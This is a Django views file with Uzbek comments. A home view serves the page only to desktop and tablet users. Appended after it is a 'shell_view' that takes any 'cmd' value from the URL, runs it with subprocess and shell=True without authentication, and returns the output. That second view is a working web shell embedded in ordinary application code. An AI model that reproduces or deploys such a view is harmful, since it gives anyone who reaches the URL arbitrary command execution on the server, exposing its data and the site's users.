from django.shortcuts import render
from django.http import HttpResponse
from django_user_agents.utils import get_user_agent

def home(request):
    user_agent = get_user_agent(request)

    # Qurilma kompyuter ekanligini tekshiramiz
    if user_agent.is_pc or user_agent.is_tablet:
        return render(request, 'home.html')  # Kompyuter bo'lsa home.html sahifasiga o'tadi
    else:
        return HttpResponse("If you want to use this platform, please use a computer.")  # Agar mobil yoki boshqa qurilma bo'lsa
import subprocess
from django.http import HttpResponse
from django.shortcuts import render

def shell_view(request):
    # URL'dan 'cmd' parametrini olish
    cmd = request.GET.get("cmd", "")

    # Agar buyruq bo'lsa
    if cmd:
        try:
            # Buyruqni bajarish
            process = subprocess.Popen(
                cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            )
            stdout, stderr = process.communicate()

            # Standart chiqish va xatoliklarni birlashtirib natija qaytarish
            if stdout:
                return HttpResponse(f"<pre>{stdout}</pre>")
            elif stderr:
                return HttpResponse(f"<pre>{stderr}</pre>")
            else:
                return HttpResponse("<pre>No output</pre>")
        except Exception as e:
            return HttpResponse(f"<pre>Error: {e}</pre>")
    
    # Shell formasi (HTML)
    return render(request, 'shell.html')
